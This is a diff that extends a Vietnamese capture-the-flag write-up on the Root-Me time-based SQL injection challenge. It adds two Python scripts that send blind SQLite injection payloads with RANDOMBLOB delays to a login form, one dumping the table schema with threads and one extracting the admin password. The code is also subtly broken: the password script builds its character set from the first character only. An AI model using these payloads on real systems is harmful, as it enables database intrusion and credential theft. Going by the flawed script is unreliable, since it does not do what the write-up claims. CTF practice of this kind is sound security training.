@@ -132,3 +132,120 @@ Và ta đã ra được flag.
 
 Nhận xét: Sau khi mình đưa a khánh, thì cách này không được hay cho lắm chỉ được dùng trong trường hợp ít còn nếu mà tầm 30 kí tự thì bốc c mà ăn lunn.Nên là các bạn có thể tham khảo cách của a Khánh [ở đây nha](https://clbuezzz.wordpress.com/2021/05/26/root-me-challenge-sql-injection-time-based/)
 
+## Improve
+
+Sau khi mình đọc và nghiên cứu script của a Khánh, mình thử một số cách khác
+
+Ở script này, mình sử dụng `ThreadPoolExecutor` từ `concurrent.futures module` để tạo ra một thread pool với 8 worker thread. Sau đó, chúng tôi mình chia danh sách `tblNameChar` thành 8 danh sách nhỏ hơn và chuyển mỗi danh sách vào một luồng thợ cùng với vị trí ký tự hiện tại.
+
+Mỗi thread này chạy hàm `query_char`, kiểm tra từng ký tự trong danh sách con được chỉ định cho vị trí hiện tại và trả về một bộ dữ liệu chứa flag boolean cho biết liệu một ký tự đã được tìm thấy hay chưa và đoạn tên bảng đã được tạo.
+
+```
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+url = 'http://challenge01.root-me.org/web-serveur/ch10/'
+
+s = requests.session()
+
+def query_char(position, char_list):
+    tblName = ""
+    found_char = False
+    for i in range(len(char_list)):
+        queryTblName = f"v' OR 5407=(case when substr((select group_concat(sql) from sqlite_master where type='table'),{position},1)='{char_list[i]}' then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
+        payload = {'username': queryTblName, 'password': 'vanir'}
+        start = time.time()
+        r = s.post(url, data=payload)
+        roundtrip = time.time() - start
+        if roundtrip > 4:
+            found_char = True
+            tblName += char_list[i]
+            print(tblName)
+            break
+    return (found_char, tblName)
+
+# Find TableName Characters list
+tblNameChar = []
+for i in range(32, 127):
+    queryTblCharacter = f"v' OR 5407=(case when instr((select group_concat(sql) from sqlite_master where type='table'),'{chr(i)}') then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
+    payload = {'username': queryTblCharacter, 'password': 'vanir'}
+    start = time.time()
+    r = s.post(url, data=payload)
+    roundtrip = time.time() - start
+    if roundtrip > 4:
+        tblNameChar.append(chr(i))
+
+print(tblNameChar)
+
+# Find TableName
+post = 0
+tblName = ""
+
+while True:
+    post += 1
+    found_char = False
+    with ThreadPoolExecutor(max_workers=8) as executor:
+        futures = [executor.submit(query_char, post, tblNameChar[i::8]) for i in range(8)]
+        for future in futures:
+            (result, name) = future.result()
+            found_char |= result
+            tblName += name
+            if found_char:
+                break
+
+    if not found_char:
+        break
+
+print(tblName)
+
+```
+
+![image](https://user-images.githubusercontent.com/115911041/235310592-20d9275c-5583-438f-971c-3a955c0577b8.png)
+
+## Tìm password
+
+```
+import requests
+import time
+
+url = 'http://challenge01.root-me.org/web-serveur/ch10/'
+s = requests.Session()
+
+# Find admin password character set
+passChar = set()
+for i in range(32, 127):
+    queryPassCharacter = f"v' OR 5407=(CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='{chr(i)}' THEN (LIKE('a',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 5407 END)-- -"
+    payload = {'username': queryPassCharacter, 'password': 'vanir'}
+    start = time.monotonic()
+    response = s.post(url, data=payload)
+    roundtrip = time.monotonic() - start
+    if roundtrip > 4:
+        passChar.add(chr(i))
+
+print(passChar)
+
+# Find admin password
+post = 0
+password = ''
+test = 0
+while True:
+    post += 1
+    for i in passChar:
+        queryPass = f"v' OR 5407=(CASE WHEN (SELECT SUBSTR(password,{post},1) FROM users WHERE username='admin')='{i}' THEN (LIKE('a',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 5407 END)-- -"
+        payload2 = {'username': queryPass, 'password': 'vanir'}
+        start = time.monotonic()
+        response = s.post(url, data=payload2)
+        roundtrip = time.monotonic() - start
+        if roundtrip > 4:
+            password += i
+            print(password)
+            break
+    else:
+        print(password)
+        break
+```
+
+Thay đổi chính là: Mình sử dụng `time.monotonic()` thay vì `time.time()`
+
+
